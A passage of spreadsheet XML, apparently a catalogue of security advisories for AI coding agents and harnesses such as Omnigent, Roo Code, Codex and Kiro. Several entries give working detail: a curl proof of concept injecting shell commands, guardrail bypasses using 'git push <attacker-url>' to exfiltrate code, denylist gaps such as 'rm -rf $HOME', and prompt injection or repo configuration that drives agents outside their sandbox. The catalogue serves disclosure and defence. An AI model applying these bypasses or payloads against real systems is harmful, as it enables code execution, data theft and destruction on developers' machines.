          <t>Omnigent: Shared Agent Bundle Overwrite Leads to Authenticated Runner RCE</t>
        </is>
      </c>
      <c r="G187" s="9" t="inlineStr">
        <is>
          <t>Omnigent is an open-source AI agent framework and meta-harness for orchestrating coding agents. Prior to 0.3.0, PUT /sessions/{session_id}/agent checks LEVEL_EDIT permission for a session but does not reject a bound shared or template agent whose agent.session_id is None. An authenticated user with edit access to a session can replace that shared agent bundle through omnigent/server/routes/sessions.py, add a stdio MCP server, and cause later sessions that use the shared agent to launch an attacker-controlled command through omnigent/tools/mcp.py. The command executes with the Omnigent runner process permissions and can expose files, credentials, workspace data, internal services, and runner availability. This issue is fixed in version 0.3.0.</t>
        </is>
      </c>
      <c r="H187" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-62674</t>
        </is>
      </c>
    </row>
    <row r="188">
      <c r="A188" s="8" t="inlineStr">
        <is>
          <t>CA-186</t>
        </is>
      </c>
      <c r="B188" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C188" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D188" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E188" s="8" t="inlineStr">
        <is>
          <t>2026-08-21</t>
        </is>
      </c>
      <c r="F188" s="9" t="inlineStr">
        <is>
          <t>Omnigent: Uploaded Agent Bundle Allows Authenticated Runner RCE via Python Callable Tools</t>
        </is>
      </c>
      <c r="G188" s="9" t="inlineStr">
        <is>
          <t>Omnigent is an open-source AI agent framework and meta-harness for orchestrating coding agents. Prior to 0.3.0, multipart POST /v1/sessions accepts an authenticated user's agent bundle and omnigent/server/bundles.py validate_agent_bundle does not reject a tools..callable dotted Python path. omnigent/runner/tool_dispatch.py _resolve_spec_callable imports the specified module and _execute_spec_callable_tool invokes the resolved function, allowing a bundle to select subprocess.check_output and execute a local command with the runner process permissions. This can expose runner files, environment variables, credentials, workspace data, internal services, and availability without administrator access. This issue is fixed in version 0.3.0.</t>
        </is>
      </c>
      <c r="H188" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-62675</t>
        </is>
      </c>
    </row>
    <row r="189">
      <c r="A189" s="8" t="inlineStr">
        <is>
          <t>CA-187</t>
        </is>
      </c>
      <c r="B189" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C189" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D189" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E189" s="8" t="inlineStr">
        <is>
          <t>2026-08-21</t>
        </is>
      </c>
      <c r="F189" s="9" t="inlineStr">
        <is>
          <t>Omnigent: Unvalidated os_env.cwd in agent bundle yields arbitrary host filesystem access on runners without OMNIGENT_RUNNER_WORKSPACE</t>
        </is>
      </c>
      <c r="G189" s="9" t="inlineStr">
        <is>
          <t>Omnigent is an open-source AI agent framework and meta-harness for orchestrating coding agents. Prior to 0.3.0, an authenticated user can upload a session-scoped agent bundle with an absolute or traversal-containing os_env.cwd value because omnigent/spec/parser.py stores the value verbatim and omnigent/spec/validator.py does not constrain it. On a runner where OMNIGENT_RUNNER_WORKSPACE is unset, omnigent/runner/resource_registry.py preserves the attacker-controlled path and omnigent/inner/os_env.py uses the resolved path as the environment root and copytree source. The _assert_within_cwd check then treats that attacker-selected root as trusted, allowing sys_os_read, write, edit, and shell tools to access runner files and environment secrets outside the intended workspace. This issue is fixed in version 0.3.0.</t>
        </is>
      </c>
      <c r="H189" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-62677</t>
        </is>
      </c>
    </row>
    <row r="190">
      <c r="A190" s="8" t="inlineStr">
        <is>
          <t>CA-188</t>
        </is>
      </c>
      <c r="B190" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C190" s="8" t="inlineStr">
        <is>
          <t>Continue</t>
        </is>
      </c>
      <c r="D190" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E190" s="8" t="inlineStr">
        <is>
          <t>2026-08-24</t>
        </is>
      </c>
      <c r="F190" s="9" t="inlineStr">
        <is>
          <t>Continue CLI through 1.5.47 Incomplete Destructive Command Denylist in Headless and Auto Mode</t>
        </is>
      </c>
      <c r="G190" s="9" t="inlineStr">
        <is>
          <t>The Continue CLI applies an incomplete denylist as its only barrier to destructive shell commands when running unattended. In headless mode and auto mode the default policy in extensions/cli/src/permissions/defaultPolicies.ts grants the Bash tool the allow permission, and permissionChecker.ts hard-blocks a command only when the terminal-security evaluator returns a disabled verdict, so isCriticalCommand in packages/terminal-security/src/evaluateTerminalCommandSecurity.ts is the sole control. Its dangerous-path test matches only /, /*, ~, ~/*, /usr, /etc, /bin and /sbin and their prefixes, so a recursive forced removal of /home, /root, /var, /opt or /srv is not disabled. The command line is parsed with shell-quote, which reduces $HOME to an empty token, so rm -rf $HOME also fails the dangerous-path test while the shell re-expands the variable when the command is spawned. find with -delete is rated high risk rather than disabled, and shred, wipefs, truncate and pkexec are not handled. Because the agent autonomously reads content it does not control, including fetched web pages, repository files and issue text, an indirect prompt injection in that content can cause an unattended run to destroy the invoking user's data.</t>
        </is>
      </c>
      <c r="H190" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-76072</t>
        </is>
      </c>
    </row>
    <row r="191">
      <c r="A191" s="8" t="inlineStr">
        <is>
          <t>CA-189</t>
        </is>
      </c>
      <c r="B191" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C191" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D191" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E191" s="8" t="inlineStr">
        <is>
          <t>2026-08-27</t>
        </is>
      </c>
      <c r="F191" s="9" t="n"/>
      <c r="G191" s="9" t="inlineStr">
        <is>
          <t>A security flaw has been discovered in RooCodeInc Roo-Code up to 3.51.1. Affected by this vulnerability is the function optimizeQuery of the file src/utils/helpers.ts of the component CodeIndexManager. Performing a manipulation results in code injection. Remote exploitation of the attack is possible. The exploit has been released to the public and may be used for attacks. Multiple isses were reported to the vendor beforehand. They explain, that "they all apply to Roo Code, a project we no longer support - the repository was archived a while ago, and we don't encourage anyone to use it." This vulnerability only affects products that are no longer supported by the maintainer.</t>
        </is>
      </c>
      <c r="H191" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-88j7-xhq4-rhh3</t>
        </is>
      </c>
    </row>
    <row r="192">
      <c r="A192" s="8" t="inlineStr">
        <is>
          <t>CA-190</t>
        </is>
      </c>
      <c r="B192" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C192" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D192" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E192" s="8" t="inlineStr">
        <is>
          <t>2026-08-27</t>
        </is>
      </c>
      <c r="F192" s="9" t="n"/>
      <c r="G192" s="9" t="inlineStr">
        <is>
          <t>A weakness has been identified in RooCodeInc Roo-Code up to 3.51.1. Affected by this issue is the function ExecaTerminalProcess of the component README File Handler. Executing a manipulation can lead to code injection. The attack can be executed remotely. The exploit has been made available to the public and could be used for attacks. Multiple isses were reported to the vendor beforehand. They explain, that "they all apply to Roo Code, a project we no longer support - the repository was archived a while ago, and we don't encourage anyone to use it." This vulnerability only affects products that are no longer supported by the maintainer.</t>
        </is>
      </c>
      <c r="H192" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3j8c-p2mq-9c5h</t>
        </is>
      </c>
    </row>
    <row r="193">
      <c r="A193" s="8" t="inlineStr">
        <is>
          <t>CA-191</t>
        </is>
      </c>
      <c r="B193" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C193" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D193" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E193" s="8" t="inlineStr">
        <is>
          <t>2026-08-28</t>
        </is>
      </c>
      <c r="F193" s="9" t="n"/>
      <c r="G193" s="9" t="inlineStr">
        <is>
          <t>A security vulnerability has been detected in RooCodeInc Roo-Code up to 3.51.1. This affects the function fetch_instructions of the file malicious_mcp_server.py of the component MCP Integration Trust Model. The manipulation leads to code injection. The attack is possible to be carried out remotely. The exploit has been disclosed publicly and may be used. Multiple isses were reported to the vendor beforehand. They explain, that "they all apply to Roo Code, a project we no longer support - the repository was archived a while ago, and we don't encourage anyone to use it." This vulnerability only affects products that are no longer supported by the maintainer.</t>
        </is>
      </c>
      <c r="H193" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-q2jq-8pm2-fj8h</t>
        </is>
      </c>
    </row>
    <row r="194">
      <c r="A194" s="8" t="inlineStr">
        <is>
          <t>CA-192</t>
        </is>
      </c>
      <c r="B194" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C194" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D194" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E194" s="8" t="inlineStr">
        <is>
          <t>2026-08-28</t>
        </is>
      </c>
      <c r="F194" s="9" t="n"/>
      <c r="G194" s="9" t="inlineStr">
        <is>
          <t>A vulnerability was detected in RooCodeInc Roo-Code up to 3.51.1. This vulnerability affects unknown code of the file src/integrations/claude-code/oauth.ts of the component OAuth Callback. The manipulation results in cleartext transmission of sensitive information. The attack may be performed from remote. A high complexity level is associated with this attack. It is stated that the exploitability is difficult. The exploit is now public and may be used. Multiple isses were reported to the vendor beforehand. They explain, that "they all apply to Roo Code, a project we no longer support - the repository was archived a while ago, and we don't encourage anyone to use it." This vulnerability only affects products that are no longer supported by the maintainer.</t>
        </is>
      </c>
      <c r="H194" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-57j6-cfwj-h582</t>
        </is>
      </c>
    </row>
    <row r="195">
      <c r="A195" s="8" t="inlineStr">
        <is>
          <t>CA-193</t>
        </is>
      </c>
      <c r="B195" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C195" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D195" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E195" s="8" t="inlineStr">
        <is>
          <t>2026-08-28</t>
        </is>
      </c>
      <c r="F195" s="9" t="n"/>
      <c r="G195" s="9" t="inlineStr">
        <is>
          <t>A flaw has been found in RooCodeInc Roo-Code up to 3.51.1. This issue affects the function path.resolve of the file src/core/tools/ApplyPatchTool.ts of the component ApplyPatchTool. This manipulation causes path traversal. It is possible to initiate the attack remotely. The exploit has been published and may be used. Multiple isses were reported to the vendor beforehand. They explain, that "they all apply to Roo Code, a project we no longer support - the repository was archived a while ago, and we don't encourage anyone to use it." This vulnerability only affects products that are no longer supported by the maintainer.</t>
        </is>
      </c>
      <c r="H195" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-pjx2-9jx7-x89r</t>
        </is>
      </c>
    </row>
    <row r="196">
      <c r="A196" s="8" t="inlineStr">
        <is>
          <t>CA-194</t>
        </is>
      </c>
      <c r="B196" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C196" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D196" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E196" s="8" t="inlineStr">
        <is>
          <t>2026-09-01</t>
        </is>
      </c>
      <c r="F196" s="9" t="n"/>
      <c r="G196" s="9" t="inlineStr">
        <is>
          <t>OpenAI Codex Desktop for Windows and macOS could execute attacker-controlled Git hooks because automated Git operations trusted the repository's local core.hooksPath setting. If a user opens an attacker-prepared repository whose preserved .git/config points core.hooksPath to an attacker-controlled directory, Codex can run a malicious hook while processing the repository. The hook executes outside Codex's command sandbox, without user approval, and with the user's privileges, allowing it to read, change, or delete the user's files and access other resources available to the user's account. An ordinary Git clone does not preserve the attacker-controlled repository-local configuration required for exploitation.</t>
        </is>
      </c>
      <c r="H196" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-433v-pqvh-w4gj</t>
        </is>
      </c>
    </row>
    <row r="197">
      <c r="A197" s="8" t="inlineStr">
        <is>
          <t>CA-195</t>
        </is>
      </c>
      <c r="B197" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C197" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D197" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E197" s="8" t="inlineStr">
        <is>
          <t>2026-09-01</t>
        </is>
      </c>
      <c r="F197" s="9" t="n"/>
      <c r="G197" s="9" t="inlineStr">
        <is>
          <t>OpenAI Codex CLI for Windows, macOS, and Linux and Codex Desktop for Windows and macOS misclassified certain PowerShell commands as safe because their command-safety parser interpreted PowerShell's stop-parsing token (--%) differently than PowerShell itself. If a user opens an attacker-prepared repository and Codex follows its instructions, Codex can run a file-writing Git command without requesting user approval. On macOS and Linux, exploitation additionally requires separately installed PowerShell Core (pwsh) to be invoked. If filesystem protections permit the write, the command can modify Codex's configuration. If Codex later loads the modified configuration, it can launch an attacker-controlled MCP server and execute code with the user's privileges, allowing it to read, change, or delete files accessible to that account. The approval bypass does not disable filesystem sandboxing; the default filesystem sandbox on macOS and Linux can prevent writes outside permitted locations.</t>
        </is>
      </c>
      <c r="H197" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-2frj-4qr5-m2rf</t>
        </is>
      </c>
    </row>
    <row r="198">
      <c r="A198" s="8" t="inlineStr">
        <is>
          <t>CA-196</t>
        </is>
      </c>
      <c r="B198" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C198" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D198" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E198" s="8" t="inlineStr">
        <is>
          <t>2026-09-01</t>
        </is>
      </c>
      <c r="F198" s="9" t="n"/>
      <c r="G198" s="9" t="inlineStr">
        <is>
          <t>OpenAI Codex CLI for Windows, macOS, and Linux and Codex Desktop for Windows and macOS automatically collected Git repository metadata without disabling the repository-local core.fsmonitor setting. If a user opens or uses an attacker-prepared repository whose preserved .git/config sets core.fsmonitor to an attacker-controlled filesystem-monitor helper, Git can execute that helper while Codex collects repository metadata. The helper runs outside Codex's command sandbox and without a user-approval prompt, allowing attacker-controlled code to run with the user's privileges. The code can read, change, or delete the user's files and access other resources available to the user's account. An ordinary Git clone does not preserve the source repository's local .git/config; exploitation requires a repository delivered or copied with that configuration intact.</t>
        </is>
      </c>
      <c r="H198" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-26wp-42v3-96xp</t>
        </is>
      </c>
    </row>
    <row r="199">
      <c r="A199" s="8" t="inlineStr">
        <is>
          <t>CA-197</t>
        </is>
      </c>
      <c r="B199" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C199" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D199" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E199" s="8" t="inlineStr">
        <is>
          <t>2026-09-01</t>
        </is>
      </c>
      <c r="F199" s="9" t="n"/>
      <c r="G199" s="9" t="inlineStr">
        <is>
          <t>OpenAI Codex Desktop for Windows and macOS automatically inspected Git metadata and working-tree status when a user opened a workspace. If the workspace contains a repository with preserved attacker-controlled .git/config, the attr.tree setting and a configured clean or process filter can cause Git to run an attacker-controlled program. The program runs outside Codex's command sandbox with the signed-in user's privileges, without a workspace-trust prompt, command approval, or interaction with a model. The attacker can read, modify, or delete files and access credentials available to that user. Exploitation requires Git to be available on PATH and the user to open the attacker-prepared repository with its local Git configuration intact. An ordinary Git clone does not copy the source repository's .git/config and is not sufficient by itself.</t>
        </is>
      </c>
      <c r="H199" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-hcf6-9q9g-xx3c</t>
        </is>
      </c>
    </row>
    <row r="200">
      <c r="A200" s="8" t="inlineStr">
        <is>
          <t>CA-198</t>
        </is>
      </c>
      <c r="B200" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C200" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D200" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E200" s="8" t="inlineStr">
        <is>
          <t>2026-09-02</t>
        </is>
      </c>
      <c r="F200" s="9" t="inlineStr">
        <is>
          <t>Omnigent Guardrail policy bypass: shell-command parser fails open in policies/builtins/_shell.py</t>
        </is>
      </c>
      <c r="G200" s="9" t="inlineStr">
        <is>
          <t>**Reporter:** Aaron / Aeon — autonomous security agent (https://github.com/aaronjmars/aeon) **Project:** `omnigent-ai/omnigent` v0.1.0 (Databricks) — meta-harness running Claude Code / Codex / Pi "in check with policies and sandboxing" **Component:** `omnigent/policies/builtins/_shell.py` (shared parser) → consumed by `policies/builtins/github.py` (`write_repos`/`write_branches` allowlist) and `policies/builtins/working_dir.py` (workspace confinement)  ## Summary  The shared shell-command parser **fails open**. When a gated command spells something the parser doesn't recognize, it produces no operation, the policy evaluator returns `None`, and `None` = abstain = **ALLOW**. So any command the parser misses bypasses both the GitHub repo/branch allowlist and the working-directory confinement — the product's two core safety guarantees.  ## Impact  A misaligned or prompt-injected agent that is *meant to be confined* can:  - `git push` to an attacker-controlled repo (code / secret exfiltration), - push to a protected branch, - escape its workspace via `git worktree add` / `git -C &lt;other-dir&gt;`.  ## Bypass classes (all verified against the real policy code)  - **Combined interpreter flags:** `bash -lc "git push &lt;attacker-url&gt;"` - **Unlisted wrappers:** `timeout` / `nice` / `setsid` / `stdbuf … git push …` - **Command substitution:** `x=$(git push &lt;attacker-url&gt;)` - **Un-split background operator:** `true &amp; git push &lt;attacker-url&gt;`  Controls that **correctly hold** (confirming this is parser incompleteness, not an allowlist logic error): bare `git push &lt;attacker-url&gt;` and `env git push …` both **DENY**.  ## Suggested fix  Make the gated surface **fail closed**:  1. An unrecognized gated command must **DENY**, not return `None` → ALLOW. Abstain on a security gate should resolve to deny, not allow. 2. Canonicalize known wrappers (`timeout` / `nice` / `setsid` / `stdbuf` / `env`) down to their inner command before evaluation. 3. Recurse into `sh -c` / `bash -c` payloads and command substitutions, and split on shell control operators (`;`, `&amp;`, `&amp;&amp;`, `||`, `|`) before judging each segment.</t>
        </is>
      </c>
      <c r="H200" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7mqg-cx4g-x2rf</t>
        </is>
      </c>
    </row>
    <row r="201">
      <c r="A201" s="8" t="inlineStr">
        <is>
          <t>CA-199</t>
        </is>
      </c>
      <c r="B201" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C201" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D201" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E201" s="8" t="inlineStr">
        <is>
          <t>2026-09-03</t>
        </is>
      </c>
      <c r="F201" s="9" t="inlineStr">
        <is>
          <t>Claude Code Templates: Unauthenticated OS command injection (RCE) in Claude Code Studio server (--studio)</t>
        </is>
      </c>
      <c r="G201" s="9" t="inlineStr">
        <is>
          <t>### Summary `npx claude-code-templates --studio` launches "Claude Code Studio", an Express HTTP server (`cli-tool/src/sandbox-server.js`, default port 3444) that binds to **all interfaces** (`0.0.0.0`), sets `Access-Control-Allow-Origin: *`, and requires **no authentication**. Two POST endpoints pass attacker-controlled request-body fields into `child_process.spawn(..., { shell: true })`. Because `shell: true` makes Node join the argv array into a single `sh -c` string, the fields are parsed by the shell and metacharacters execute. Any unauthenticated attacker who can reach the port — a malicious web page the developer visits, or anyone on the same LAN — can execute arbitrary OS commands on the developer's machine.  ### Details In `cli-tool/src/sandbox-server.js`:  - `app.listen(PORT, ...)` is called with no host argument, so the server listens on `0.0.0.0` / `::` (reachable from the LAN, not just localhost). - The CORS middleware sends `Access-Control-Allow-Origin: *` and answers the preflight `OPTIONS` for any origin, so a browser will deliver cross-origin POSTs to it. - There is no authentication on any endpoint.  The vulnerable sinks:  1. `POST /api/execute` — the `prompt` body field flows into `executeLocalTask()`:    ```js    const child = spawn('claude', [finalPrompt], { /* ... */ shell: true });    The only validation on prompt is a length check (&gt;= 10 chars). With shell: true, finalPrompt is interpreted by the shell.  2. POST /api/install-agent — the agentName body field: const child = spawn('npx', ['claude-code-templates@latest', '--agent', agentName, '--yes'], { /* ... */ shell: true }); 2. agentName is used unvalidated. (The same unsafe pattern is also reachable through /api/execute's agent field via checkAndInstallAgent().)  Root cause: spawn(cmd, argsArray, { shell: true }) does not keep argsArray as separate argv entries — Node builds cmd + ' ' + argsArray.join(' ') and runs it via sh -c, so every element is subject to shell parsing.  PoC  # Victim npx claude-code-templates --studio          # server on 0.0.0.0:3444  # Attacker (another LAN host, or a malicious web page fetch(), or locally) curl -s -X POST http://127.0.0.1:3444/api/execute \   -H 'Content-Type: application/json' \   --data '{"prompt":"aaaaaaaaaa; touch /tmp/CCT_RCE_PROOF","mode":"local"}'  curl -s -X POST http://127.0.0.1:3444/api/install-agent \   -H 'Content-Type: application/json' \   --data '{"agentName":"x; touch /tmp/CCT_AGENT_PROOF #"}'  ls -la /tmp/CCT_RCE_PROOF /tmp/CCT_AGENT_PROOF   # both created =&gt; injected commands ran The aaaaaaaaaa padding satisfies the 10-char minimum, then ; (or $(...), or backticks) starts the injected command. claude/npx do not even need to be installed — the injected segment runs regardless.  Confirmed at runtime on v1.28.13 (Node 22, Linux): both marker files were created, the server listened on *:3444, and an OPTIONS preflight from Origin: https://evil.example returned 200 with Access-Control-Allow-Origin: *.  Impact  Unauthen</t>
        </is>
      </c>
      <c r="H201" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-79wm-x847-7cvg</t>
        </is>
      </c>
    </row>
    <row r="202">
      <c r="A202" s="8" t="inlineStr">
        <is>
          <t>CA-201</t>
        </is>
      </c>
      <c r="B202" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C202" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D202" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E202" s="8" t="inlineStr">
        <is>
          <t>2026-09-08</t>
        </is>
      </c>
      <c r="F202" s="9" t="n"/>
      <c r="G202" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in GitHub Copilot and Visual Studio Code allows an unauthorized attacker to disclose information over a network.</t>
        </is>
      </c>
      <c r="H202" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-r64m-65x5-h3wx</t>
        </is>
      </c>
    </row>
    <row r="203">
      <c r="A203" s="8" t="inlineStr">
        <is>
          <t>CA-202</t>
        </is>
      </c>
      <c r="B203" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C203" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D203" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E203" s="8" t="inlineStr">
        <is>
          <t>2026-09-08</t>
        </is>
      </c>
      <c r="F203" s="9" t="n"/>
      <c r="G203" s="9" t="inlineStr">
        <is>
          <t>Insufficiently protected credentials in GitHub Copilot and Visual Studio Code allows an unauthorized attacker to disclose information over a network.</t>
        </is>
      </c>
      <c r="H203" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-8qwj-prhm-6mp3</t>
        </is>
      </c>
    </row>
    <row r="204">
      <c r="A204" s="8" t="inlineStr">
        <is>
          <t>CA-203</t>
        </is>
      </c>
      <c r="B204" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C204" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D204" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E204" s="8" t="inlineStr">
        <is>
          <t>2026-09-08</t>
        </is>
      </c>
      <c r="F204" s="9" t="n"/>
      <c r="G204" s="9" t="inlineStr">
        <is>
          <t>Roo-Code through 3.54.0 contains an auto-approve bypass vulnerability in the shell command parsing logic that allows attackers to execute denied shell commands by exploiting the omission of the bash pipe operator from the command parser's operator token set. Attackers can craft a command line with an allowlisted prefix followed by the stderr-redirecting pipe operator and a denied command, causing the parser to approve the full pipeline while bash executes the denied component with the agent's auto-execute privileges on the developer's machine.</t>
        </is>
      </c>
      <c r="H204" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-cvxc-67pr-wffj</t>
        </is>
      </c>
    </row>
    <row r="205">
      <c r="A205" s="8" t="inlineStr">
        <is>
          <t>CA-204</t>
        </is>
      </c>
      <c r="B205" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C205" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D205" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E205" s="8" t="inlineStr">
        <is>
          <t>2026-09-08</t>
        </is>
      </c>
      <c r="F205" s="9" t="n"/>
      <c r="G205" s="9" t="inlineStr">
        <is>
          <t>Roo-Code through 3.54.0 contains an auto-approve bypass vulnerability that allows attackers to execute denied shell commands by exploiting a word-boundary mismatch in comment handling between the approval gate's shell parser and bash. Attackers can craft a command string with an allowlisted word immediately followed by a hash character, separator, and denied command to pass the approval gate while bash executes the denied command with the agent's auto-execute privileges on the developer's machine.</t>
        </is>
      </c>
      <c r="H205" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-8fwh-72qq-gr52</t>
        </is>
      </c>
    </row>
    <row r="206">
      <c r="A206" s="8" t="inlineStr">
        <is>
          <t>CA-205</t>
        </is>
      </c>
      <c r="B206" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C206" s="8" t="inlineStr">
        <is>
          <t>Gemini CLI</t>
        </is>
      </c>
      <c r="D206" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E206" s="8" t="inlineStr">
        <is>
          <t>2026-09-10</t>
        </is>
      </c>
      <c r="F206" s="9" t="n"/>
      <c r="G206" s="9" t="inlineStr">
        <is>
          <t>A vulnerability in the Gemini CLI and associated GitHub Action allowed an unprivileged attacker to achieve an arbitrary code execution in Gemini CLI via untrusted local .env files overriding GEMINI_CLI_HOME.</t>
        </is>
      </c>
      <c r="H206" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-2255-3477-vp73</t>
        </is>
      </c>
    </row>
    <row r="207">
      <c r="A207" s="8" t="inlineStr">
        <is>
          <t>CA-206</t>
        </is>
      </c>
      <c r="B207" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C207" s="8" t="inlineStr">
        <is>
          <t>OpenCode</t>
        </is>
      </c>
      <c r="D207" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E207" s="8" t="inlineStr">
        <is>
          <t>2026-09-10</t>
        </is>
      </c>
      <c r="F207" s="9" t="inlineStr">
        <is>
          <t>knowns before 0.31.0 External Control of Agent Working Directory via x-opencode-directory Header</t>
        </is>
      </c>
      <c r="G207" s="9" t="inlineStr">
        <is>
          <t>knowns versions before 0.31.0 fail to properly validate the x-opencode-directory request header in the /api/opencode proxy endpoint. Remote attackers can supply arbitrary directory paths to execute file operations outside the project root on the host system.</t>
        </is>
      </c>
      <c r="H207" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-88899</t>
        </is>
      </c>
    </row>
    <row r="208">
      <c r="A208" s="8" t="inlineStr">
        <is>
          <t>CA-207</t>
        </is>
      </c>
      <c r="B208" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C208" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D208" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E208" s="8" t="inlineStr">
        <is>
          <t>2026-09-11</t>
        </is>
      </c>
      <c r="F208" s="9" t="n"/>
      <c r="G208" s="9" t="inlineStr">
        <is>
          <t>Inclusion of functionality from an untrusted control sphere in the Kiro Powers feature in Amazon Kiro IDE before version 0.8.135 might allow remote unauthenticated actors to obtain sensitive information from a developer workstation. Crafted repository content can cause the agent to modify the workspace settings file, which redirects the Kiro Powers registry request to an actor controlled endpoint and sends workspace data to that endpoint when the Powers panel is opened.    To remediate this issue, users should upgrade to Kiro IDE version 0.8.135 or later. Users who opened a project in an earlier version should also rotate any credentials that were present in that project.</t>
        </is>
      </c>
      <c r="H208" s="10" t="inlineStr">
        <is>
